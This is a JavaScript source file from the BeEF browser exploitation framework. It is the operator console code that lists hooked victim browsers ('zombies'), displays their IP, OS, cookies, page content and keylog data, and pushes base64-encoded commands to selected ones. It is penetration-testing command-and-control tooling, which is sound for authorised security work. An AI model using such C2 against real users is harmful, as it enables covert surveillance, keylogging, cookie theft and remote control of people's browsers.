// Copyright (c) 2006-2009, Wade Alcorn 
// All Rights Reserved
// wade@bindshell.net - http://www.bindshell.net

function update_zombie_div(div, id, detail) {
	new Ajax.Updater(div, 'get_zombie_details.php?zombie=' + id + '&detail=' + detail, {asynchronous:true});
}

// --[ ZOMBIE CLASS
var Zombie = Class.create();
Zombie.prototype = {
	initialize: function(id, frequency) {
		this.version	= '0.1',
		this.authors	= 'Wade Alcorn <wade@bindshell.net>, Alexios Fakos <beef.20.alfa@spamgourmet.com>',
		this.frequency	= frequency,
		this.id		= id,
		this.ip 		= '',
		this.agent_image	= '',
		this.os_image		= ''
	},
	create_button: function(highlighted) {
	},
	get_results: function() {
		update_zombie_div('zombie_results_data', this.id, 'results');
	},
	get_keylog: function() {
		update_zombie_div('keylog_data', this.id, 'keylog');
	},
	get_static_data: function() {
		update_zombie_div('os_data', this.id, 'os');
		update_zombie_div('browser_data', this.id, 'browser');
		update_zombie_div('screen_data', this.id, 'screen');
		update_zombie_div('cookie_data', this.id, 'cookie');
		update_zombie_div('content_data', this.id, 'content');
		update_zombie_div('loc_data', this.id, 'loc');
		update_zombie_div('keylog_data', this.id, 'keylog');
		update_zombie_div('zombie_results_data', this.id, 'results');
	},
	set_id: function(zombie) {
		this.id = zombie;
	
		this.get_static_data();
		this.get_results();
		this.get_keylog();

		element = Builder.node('div',{id:'zombie_header'},[
			Builder.node('img',{src:'/beef/images/' + this.agent_image,border:"0",height:"16",width:"16"}),
			Builder.node('img',{src:'/beef/images/' + this.os_image,border:"0",height:"16",width:"16"}),
			" " + this.ip
		]);

		$('zombie_icons').innerHTML = "";
		$('zombie_icons').appendChild(element);
	},
	heartbeat: function() {
		this.get_results();
		this.get_keylog();
	}
}

// --[ ZOMBIELIST CLASS
var ZombieList = Class.create();
ZombieList.prototype = {
	initialize: function(frequency) {
		this.version   = '0.1',
		this.authors   = 'Wade Alcorn <wade@bindshell.net>, Alexios Fakos <beef.20.alfa@spamgourmet.com>',
		this.frequency = frequency,

		this.zombies = new Array();
		this.selected_zombies = new Array();
		this.zombie_data = new Array();
		this.zombie_ids = new Array();
		this.new_zombies = new Array();
		this.expired_zombies = new Array();
		this.current_zombie = 'none';
		this.zombie = new Zombie(this.current_zombie, this.frequency);
	},
	update: function() {

		var x = new Ajax.Request(
			'get_zombie_details.php?zombie=all&detail=list',
			{
				method: 'get',
				asynchronous: false,
				evalScripts: false,
// 				parameters:  'func=' + func + '&zombie=' + this.zombie
			}
		);
		var raw_zom_id_str = x.transport.responseText;

		if(raw_zom_id_str.match(/none/)) {
			$('zombiesdyn').innerHTML = "No Zombies Available";
			return;
		} else if (this.zombie_ids.length == 0) {
			$('zombiesdyn').innerHTML = "";
		}

		zom_id_arr = raw_zom_id_str.split(',');

		this.new_zombies = diff(zom_id_arr, this.zombie_ids);
		this.expired_zombies = diff(this.zombie_ids, zom_id_arr);
		this.expired_zombies = this.expired_zombies.unique();

		this.zombie_ids = this.zombies.concat(zom_id_arr);
		this.zombie_ids = this.zombie_ids.unique();

		for(var i = 0; i < this.new_zombies.length; i++) {
			this.add(this.new_zombies[i]);
		}

		for(var i = 0; i < this.expired_zombies.length; i++) {
			$('zombiesdyn').removeChild(this.zombie_data[this.expired_zombies[i]]['button_element']);
		}
	},
	add: function(zombie_id) {
		this.zombie_data[zombie_id] = new Array();

		var x = new Ajax.Request(
			'get_zombie_details.php?zombie=' + zombie_id + '&detail=metadata',
			{
				method: 'get',
				asynchronous: false,
				evalScripts: false,
			}
		);
		var raw_zom_id_str = x.transport.responseText;
		zombie_details_arr = raw_zom_id_str.split(',');

		this.zombie_data[zombie_id]['ip'] = zombie_details_arr[0];
		this.zombie_data[zombie_id]['agent_image'] = zombie_details_arr[1];
		this.zombie_data[zombie_id]['os_image'] = zombie_details_arr[2];

		element = Builder.node('div',{id:'zombies'},[
			Builder.node('a',{href:"javascript:select_zombie('" + zombie_id + "')"},[
				Builder.node('img',{src:'/beef/images/' + this.zombie_data[zombie_id]['agent_image'],align:"top",border:"0",height:"12",width:"12"}),
				Builder.node('img',{src:'/beef/images/' + this.zombie_data[zombie_id]['os_image'],align:"top",border:"0",height:"12",width:"12"}),
				Builder.node('div',{id:'zombietext'},[this.zombie_data[zombie_id]['ip']]),
			]),
		]);

		this.zombie_data[zombie_id]['button_element'] = element;

		$('zombiesdyn').appendChild(element);

	},
	highlight_button: function(zombie_id) {
		this.zombie_data[zombie_id]['button_element'].style.backgroundColor='#CCCCCC'
	},
	unhighlight_button: function(zombie_id) {
		this.zombie_data[zombie_id]['button_element'].style.backgroundColor='#FFFFFF'
	},
	select_zombie: function(zombie_id) {
		if(this.selected_zombies.indexOf(zombie_id) < 0) {
			this.selected_zombies.push(zombie_id);
			this.highlight_button(zombie_id);
		} else {
			this.selected_zombies.splice(this.selected_zombies.indexOf(zombie_id),1);
			this.unhighlight_button(zombie_id);
		}
	},
	send_code: function(code) {
		if(!this.selected_zombies.length) {
			beef_error('No Zombie Selected. Select zombie(s) in the sidebar');
		}
		
		// this is a work-around for a bug in Ajax.Updater - it doens't like '==' in a get param
		if(decode64(code).length%3 == 1) {
			tmp_code = decode64(code);
			tmp_code += ";";
			code = encode64(tmp_code);
		}
		
		this.selected_zombies.each( function(id) {			
			var params = 'data='+code;
			new Ajax.Updater('module_status', 'send_cmds.php?action=cmd&zombie=' + id, {method:'post',parameters:params,asynchronous:false});
		});
	},
	heartbeat: function() {
		this.update();
		this.zombie.heartbeat();

		// update menu
		update_zombie_div('zombie_menu', 'none', 'menu');
	},
	set_current_zombie: function(zombie_id) {
		this.current_zombie = zombie_id;

		this.zombie.ip		    = this.zombie_data[zombie_id]['ip'];
		this.zombie.agent_image = this.zombie_data[zombie_id]['agent_image'];
		this.zombie.os_image	= this.zombie_data[zombie_id]['os_image'];

		this.zombie.set_id(zombie_id);
	},
	get_html_buttons: function() {
		update_zombie_div('zombiesdyn', this.current_zombie, 'buttons');
	},
	clear_current_zombie_results: function() {
		update_zombie_div('zombie_results_data', this.current_zombie, 'deleteresults');
	}
}
